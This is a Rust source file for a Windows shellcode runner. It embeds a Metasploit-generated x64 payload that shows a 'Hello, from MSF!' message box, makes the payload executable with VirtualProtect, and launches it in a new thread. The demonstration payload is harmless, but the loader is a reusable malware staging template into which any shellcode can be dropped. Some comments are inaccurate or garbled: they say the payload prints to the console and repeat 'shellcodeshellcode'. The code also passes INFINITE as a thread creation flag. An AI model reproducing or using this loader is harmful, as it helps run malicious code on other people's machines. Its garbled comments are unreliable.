use winapi::um::winnt::PAGE_EXECUTE;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::HANDLE;
use winapi::shared::minwindef::LPVOID;
use winapi::shared::minwindef::DWORD;
//use winapi::shared::minwindef::FALSE;
use winapi::um::handleapi::CloseHandle;
use std::{mem::transmute, ptr::null_mut};

#[no_mangle]
#[link_section = ".text"]
static buf: [u8; 318] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
0x48,0x8d,0x8d,0x26,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1f,0x01,
0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
0x48,0x65,0x6c,0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,
0x4d,0x53,0x46,0x21,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];

/// This function will run the shellcode
/// It will create a new thread and run the shellcode
/// The shellcode will print "Hello, from MSF!" to the console
#[cfg(windows)]
fn runmal() {
    let mut old_protect = 0 as DWORD; // old protection level of memory region

    unsafe {
        // Change the protection level of the memory region to PAGE_EXECUTE
        VirtualProtect(
            buf.as_ptr() as *mut _,           // pointer to the memory region, in this case the shellcode array
            318,                                 // size of the shellcode memory region
            PAGE_EXECUTE as DWORD,         // new protection level
            &mut old_protect             // pointer to the variable that will store the old protection level
        );

        // Create a new thread and run the shellcode
        let thread_handle: HANDLE = CreateThread(
            null_mut(),              // default security attributes
            0,                              // default stack size
            Some(
                transmute::<_, unsafe extern "system" fn(LPVOID) -> DWORD>(buf.as_ptr() as *const _) // pointer to the shellcodeshellcode as extern "system" fn(_) -> _),   // address of the shellcodeshellcode.as_ptr()),     // address of the start of the thread's code
            ),
            null_mut(),                     // no parameters to pass to the thread
            INFINITE,                   // run the thread indefinitely
            null_mut(),                    // no thread ID is returned
        );

        if thread_handle.is_null() {
            panic!("Failed to create thread");
        }

        CloseHandle(thread_handle);
    }
}

#[cfg(not(windows))]
fn runmal() {
    println!("windows only");
}

fn main(){
    runmal();
}
